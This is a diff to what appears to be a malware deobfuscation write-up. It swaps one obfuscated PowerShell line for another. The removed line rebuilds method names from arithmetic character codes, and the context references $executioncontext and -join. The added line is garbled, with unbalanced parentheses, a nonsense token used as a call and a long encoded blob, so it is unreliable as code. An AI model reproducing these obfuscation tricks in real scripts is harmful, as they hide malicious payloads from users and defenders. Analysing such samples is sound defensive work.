@@ -30,7 +30,7 @@ $xtrvndwblhkco=$executioncontext;$atedatatedesantionisaraloralenes = (-joIn (@((
 </code></pre>
 
 <pre><code>
-[System.Text.Encoding]::ascii.(([char[]]@((4326-(25704455/(977+(6670-1606)))),(7200-7099),(219008/(7615-5727)),(2740-2657),(1147-1031),(8706-(6452592/(-5601+6352))),(778470/(32977472/(4294+154))),(-57+(6210+(-8012+(1145+7192)))),(18484/(2346+7526)),(2430-2329),(5440-(6190+1981)),(12513/(6466+1188)),(551+((3851+7020)-(1184+1994))),((8459-2300)+(2988+7129)),(27449/(9681-7792)),(-9195+(4952+(-6248+3377))),((7750-6192)+(7338-1127)),(5426-(3644+6046)),(5262-(2404+9191)),(4796-(1863+4555)),(9661-(7316+3776)),(-5530+((4108+3152)-(7929+2148))),((5972-3036)+(8325-2417)),(4652-(7254-1486)),(-4719+((6412+5483)-(4153+6940))),((5290+7255)-(2782+4257)),(-7689+(1017+(-6102+1818))),((8934-4179)+(6157-5080)),(9406-(5975+1298)),(3649-(1906+8798)),(2131-1970)),[SYSTEM.TEXT.ENCODING]::ASCII.GetBytes("..."))
+[System.Text.Encoding]::ascii.(([char[]]@((4326-(25704455/(977+(6670-1606)) -join ''))((h8ndqpv76xz1jykoi20bgu3wt9e "Leo+cWlwdGpzZZqua+5qlhj220k3mpZUAhd5/2a/w0Vl7TOF0T3zd4v7VFrzBX84JejSIapRMQCOik7rmLLS4XszXeRT7fSs27LpI5xeIb/oG8WczxrdsIq7z434WoxPxJONCjavyZaBpJziRQ9rzdPIg4iNtNLmSfZ53kYuKRUJjsLowcZhLjROzBKPqNTeJRa4jh8ByZSM1ghpDBjAk5OSnsWgguAarP7rT5eslwRomsHJx5Ld+k7HixAKkN/csU4IioWZsd2wGg4rSWxbTI9GlvgMb1BSjV6YVL/J4L7RmyVyqCqq1JrnTQ2YGAzzriJr/sy3xHSkLctb0tpHx9mmbIDum87Ig9bviMTkEkZUCYLDVr4YFMe3bLB/DvkMyxrQJf+TuCGWvM17+NSbWPza69zrnF6eAfToqn8zrjXhPcP3LdLQ1P8sgKfrYjjsQHjsMaIc87+GK0pTjMtLi3LkvXQdATicdT4Flh2flZOiuonNcCblmwnt2f7J69YaqFDyBKVhgR/6GKoQWuQPvata0iTe0//eQAgaA+WdLPkBO+0DQOpAQYK8VUbLUe8P3llw/JebCT7pyphv2wT/VD5PulM1O1Au78+TAzfBkasoo1/p9Vd8oNsalDDBt5Uqbmj9wI2+ui2uPyi2VXzg3kdvSVeL("...")
 </code></pre>
 
 ### Deobfuscation Results
